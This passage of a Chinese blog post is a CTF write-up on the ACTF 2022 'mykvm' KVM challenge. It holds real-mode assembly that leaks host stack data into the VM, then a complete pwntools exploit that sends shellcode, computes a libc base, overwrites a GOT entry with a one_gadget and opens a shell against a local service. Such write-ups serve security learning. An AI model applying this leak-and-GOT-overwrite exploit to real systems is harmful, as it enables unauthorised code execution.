+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;linux/kvm.h></span></span>
+
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VM 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VM<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_USER_MEMORY_REGION 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_USER_MEMORY_REGION<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_CREATE_VCPU 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_CREATE_VCPU<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_VCPU_MMAP_SIZE 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_REGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_REGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_GET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_GET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_SET_SREGS 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_SET_SREGS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"KVM_RUN 0x%llx\\n"</span><span class="token punctuation">,</span>KVM_RUN<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">KVM_CREATE_VM 0xae01
+KVM_SET_USER_MEMORY_REGION 0x4020ae46
+KVM_CREATE_VCPU 0xae41
+KVM_GET_VCPU_MMAP_SIZE 0xae04
+KVM_GET_REGS 0x8090ae81
+KVM_SET_REGS 0x4090ae82
+KVM_GET_SREGS 0x8138ae83
+KVM_SET_SREGS 0x4138ae84
+KVM_RUN 0xae80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>现在输出的值就和题目中一样了，可以根据这些值，配合上面的KVM项目源码对程序进行还原，在IDA中创建了结构体并命名变量后就很接近源码，分析起来就很轻松了。最终得到如下内容：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181726045.png" alt="image-20220629181726045"><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220630144839668.png" alt="image-20220630144839668"></p>
+<h1 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h1><p>我这里是Mac + VMware + Ubuntu 16，开启了VT虚拟化也找不到&#x2F;dev&#x2F;kvm，但是ubuntu 18&#x2F;20是有这个设备文件的，VirtualBox也是有设备文件的，但是VirtualBox太卡了，所以最终还是妥协，使用Windows + VMware + ubuntu + docker来执行程序，在Ubuntu中使用docker的原因是尽可能的还原题目的环境，和远程保持一致。在docker中开启1234端口，然后gdbserver监听，在ubuntu中远程调试，启动方法如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">sudo docker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">1234</span><span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">-</span>p <span class="token number">8888</span><span class="token operator">:</span><span class="token number">8888</span> <span class="token operator">--</span>privileged <span class="token operator">--</span>cap<span class="token operator">-</span>add<span class="token operator">=</span>SYS_PTRACE mykvm
+gdbserver <span class="token operator">:</span><span class="token number">1234</span> <span class="token operator">--</span>attach PID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><p>程序中最明显的漏洞点在于 <code>size</code> 判断，可发生整数溢出：</p>
+<p>![image-20220629181756669](&#x2F;Users&#x2F;wangzhenghan&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220629181756669.png)但是通过测试的结果，发现这里的漏洞并不能进行利用，在进入<code>run_kvm</code>函数之后有<code>memcpy</code>函数使用这个<code>size</code>，如果<code>size</code>过大会导致<code>memcpy</code>报错程序崩溃。</p>
+<p>还有另一处不太明显的漏洞，存在于<code>run_kvm</code>函数内部，<code>memcpy</code>从栈中拷贝数据到bss段0x603000处，<code>size</code>是我们可控的，虽然栈大小大于可控size 0x1000，但还是不可避免的拷贝了一些宿主机的栈内容到VM中，造成内存泄露，稍后会验证这一点。</p>
+<p>我们可以写一段汇编代码，来遍历整个VM空间，由于是实模式，寻址最多只能20位，所以最多可以遍历0～0xfffff地址的内容，实际上只需要0xffff就足够了，不需要去绞尽脑汁写16位的段寄存器寻址。以下代码会输出VM中0～0xffff内存的所有内容：</p>
+<pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0</span>
+mov dx,<span class="token number">0x217</span>
+.<span class="token keyword">start</span>:
+mov al,[di]
+out dx,al
+inc di
+cmp di,<span class="token number">0xffff</span>
+jne .<span class="token keyword">start</span>
+hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后我们可以使用pwntools接收输出内容，并将内容保存成文件，以便分析：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在导出的文件中可以看到一些宿主机地址，大概偏移在0x400附近，证明了之前说过的memcpy把宿主机栈内容拷贝了进来：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181811450.png" alt="image-20220629181811450">也就是说如果我们写汇编代码将偏移位置的值打印出来就可以完成泄露。经过调试偏移，泄露地址的汇编如下：</p>
+<pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>
+mov dx,<span class="token number">0x217</span>
+.<span class="token keyword">start</span>:
+mov al,[di]
+out dx,al
+inc di
+cmp di,<span class="token number">0x41e</span>
+jne .<span class="token keyword">start</span>
+hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>泄露后有了libc地址，要考虑如何利用。</p>
+<p>程序执行完<code>run_kvm</code>后有一个交互可以输入，并将输入内容拷贝到bss段的<code>dest</code>处，最后调用<code>puts</code>函数后返回：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181825152.png" alt="image-20220629181825152">由于<code>dest</code>存储<code>malloc</code>的一个堆地址，我们可以尝试在VM内存中搜索这个堆地址，计算它在内存中的偏移，就像泄露地址那样，然后在VM中使用汇编对其进行修改，改为got表的地址，在要求输入“host name“时将<code>puts</code>地址改为one_gadget的地址，最后调用<code>puts</code>其实就调用了one_gadget，拿到shell。</p>
+<p>开启ASLR堆地址会发生变化，在搜索的时候不太方便，可以关闭ASLR来保证每次分配的地址都是一样的，方便搜索。我们还是用之前的汇编将内存dump出来，我这里的堆地址0x60b010，找到在偏移0x7100附近：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181837840.png" alt="image-20220629181837840"></p>
+<p>以下是开了ASLR的情况，也是在0x7100附近：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181847463.png" alt="image-20220629181847463"></p>
+<p>经过调试计算得出偏移在0x7100，编写汇编代码，将此处改为got附近的地址，这里将其改为了0x60200d：</p>
+<pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x7100</span>
+mov al,<span class="token number">0x0d</span>
+mov [di],al
+mov al,<span class="token number">0x20</span>
+mov [di<span class="token number">+1</span>],al
+mov al,<span class="token number">0x60</span>
+mov [di<span class="token number">+2</span>],al
+mov al,<span class="token number">0</span>
+mov [di<span class="token number">+3</span>],al
+mov al,<span class="token number">0</span>
+mov [di<span class="token number">+4</span>],al
+mov al,<span class="token number">0</span>
+mov [di<span class="token number">+5</span>],al
+hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后发现输入完”host name“后，<code>memcpy</code>函数会向0x60200d进行拷贝，证明修改<code>dest</code>成功：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181857455.png" alt="image-20220629181857455">正常来说这里直接修改<code>puts</code>的got就可以了，但还需要考虑一个情况，<code>readline</code>函数会调用<code>malloc</code>，堆管理比较混乱，并且不会读入不可见字符，因此最好是修改<code>puts</code>的最后3个byte成功率会高一些，这也是为什么把写入地址设置为0x60200d的原因。（另外，ASLR对于KVM有一定的影响，在不开启ASLR时，需要泄露的内存偏移在0x9b98，会直接泄露一个<code>main_arena+0x88</code>的地址，成功率100%，但却打不通开了ASLR的情况，具体什么原因还不是很懂，需要进一步的学习）</p>
+<p>最终泄露、写入的汇编代码如下：</p>
+<pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">mov di,<span class="token number">0x416</span>
+mov dx,<span class="token number">0x217</span>
+.<span class="token keyword">start</span>:
+mov al,[di]
+out dx,al
+inc di
+cmp di,<span class="token number">0x41e</span>
+jne .<span class="token keyword">start</span>
+
+mov di,<span class="token number">0x7100</span>
+mov al,<span class="token number">0x08</span>
+mov [di],al
+mov al,<span class="token number">0x20</span>
+mov [di<span class="token number">+1</span>],al
+mov al,<span class="token number">0x60</span>
+mov [di<span class="token number">+2</span>],al
+mov al,<span class="token number">0</span>
+mov [di<span class="token number">+3</span>],al
+mov al,<span class="token number">0</span>
+mov [di<span class="token number">+4</span>],al
+mov al,<span class="token number">0</span>
+mov [di<span class="token number">+5</span>],al
+hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp代码如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'sp'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+
+<span class="token comment">#io = process("./mykvm")</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span>
+<span class="token comment">#shellcode = "\xbf\x00\x00\xba\x17\x02\x8a\x05\xee\x47\x83\xff\xff\x75\xf7\xf4"     # search all memory</span>
+<span class="token comment">#shellcode = "\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xf4" # leak where to read</span>
+<span class="token comment">#shellcode = "\xbf\x00\x71\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x08\x71\x75\xf6\xf4" # leak where to write</span>
+shellcode <span class="token operator">=</span> <span class="token string">"\xbf\x16\x04\xba\x17\x02\x8a\x05\xee\x47\x81\xff\x1e\x04\x75\xf6\xbf\x00\x71\xb0\x0d\x88\x05\xb0\x20\x88\x45\x01\xb0\x60\x88\x45\x02\xb0\x00\x88\x45\x03\xb0\x00\x88\x45\x04\xb0\x00\x88\x45\x05\xf4"</span>
+
+<span class="token triple-quoted-string string">'''
+search memory:
+
+mov di,0
+mov dx,0x217
+.start:
+mov al,[di]
+out dx,al
+inc di
+cmp di,0xffff
+jne .start
+hlt
+'''</span>
+
+<span class="token triple-quoted-string string">'''
+leak libc:
+
+mov di,0x416
+mov dx,0x217
+.start:
+mov al,[di]
+out dx,al
+inc di
+cmp di,0x41e
+jne .start
+hlt
+'''</span>
+
+<span class="token triple-quoted-string string">'''
+leak mem idx:
+
+mov di,0x7100
+mov dx,0x217
+.start:
+mov al,[di]
+out dx,al
+inc di
+cmp di,0x7108
+jne .start
+hlt
+'''</span>
+
+
+<span class="token triple-quoted-string string">'''
+write memory:
+
+mov di,0x416
+mov dx,0x217
+.start:
+mov al,[di]
+out dx,al
+inc di
+cmp di,0x41e
+jne .start
+
+mov di,0x7100
+mov al,0x08
+mov [di],al
+mov al,0x20
+mov [di+1],al
+mov al,0x60
+mov [di+2],al
+mov al,0
+mov [di+3],al
+mov al,0
+mov [di+4],al
+mov al,0
+mov [di+5],al
+hlt
+'''</span>
+
+<span class="token keyword">def</span> <span class="token function">save_mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        content <span class="token operator">+=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dumpmem'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"your code size: \n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"your code: \n"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
+
+<span class="token comment"># gdb.attach(io,"b *0x40111d")</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest name: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guest passwd: "</span><span class="token punctuation">,</span><span class="token string">"unr4v31"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># save_mem()</span>
+<span class="token comment"># raw_input()</span>
+<span class="token keyword">def</span> <span class="token function">findidx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        byte <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> byte <span class="token operator">==</span> <span class="token string">'\x7f'</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+            <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+<span class="token comment"># findidx()</span>
+<span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7198</span><span class="token operator">-</span><span class="token number">0x610000</span>
+info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x45226</span>
+info<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"host name: "</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x1d</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xff0000</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://lwn.net/Articles/658511/">Using the KVM API</a></p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16-rc1/source/include/uapi/linux/kvm.h#L98">kvm.h - include&#x2F;uapi&#x2F;linux&#x2F;kvm.h - Linux source code (v5.16-rc1) - Bootlin</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5ec4507e9be0">【KVM】KVM学习-实现自己的内核</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://david942j.blogspot.com/2018/10/note-learning-kvm-implement-your-own.html">Note] Learning KVM - implement your own kernel</a></p>
+<p><a target="_blank" rel="noopener" href="https://c9x.me/x86/html/file_module_x86_id_139.html">x86 Instruction Set Reference</a></p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/28/mykvm/">ACTF 2022 Pwn mykvm</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">unr4v31</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://unrav31.github.io/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/">https://unrav31.github.io/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">unr4v31</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="从一道CTF题目学习KVM">
+                        
+                        <span class="card-title">从一道CTF题目学习KVM</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            unr4v31
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/05/31/def-con-qualifier-2022/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="DEF CON Qualifier 2022">
+                        
+                        <span class="card-title">DEF CON Qualifier 2022</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            unr4v31
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
